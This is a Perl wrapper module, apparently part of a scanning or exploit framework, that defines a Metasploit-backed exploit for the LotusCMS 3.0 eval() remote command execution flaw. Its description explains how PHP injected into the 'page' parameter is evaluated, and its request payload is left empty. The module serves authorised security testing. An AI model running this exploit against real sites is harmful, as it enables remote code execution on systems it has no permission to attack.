package LCMS::MSF::LcmsPhpExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "LcmsPhpExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a vulnerability found in Lotus CMS 3.0's Router()

        function.  This is done by embedding PHP code in the 'page' parameter,

        which will be passed to a eval call, therefore allowing remote code execution.



          The module can either automatically pick up a 'page' parameter from the

        default page, or manually specify one in the URI option.  To use the automatic

        method, please supply the URI with just a directory path, for example: \"/lcms/\".

        To manually configure one, you may do: \"/lcms/somepath/index.php?page=index\"

      ",
  MSF_MODULE => "lcms_php_exec",
  OSVDB => 75095,
  REFERENCES => ["http://secunia.com/secunia_research/2011-21/"],
  TITLE => "LotusCMS 3.0 eval() Remote Command Execution",
  VARIABLES => {
    'URI' =>       { DESCRIPTION => "URI", VALUE => "/lcms/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT6 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #6 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
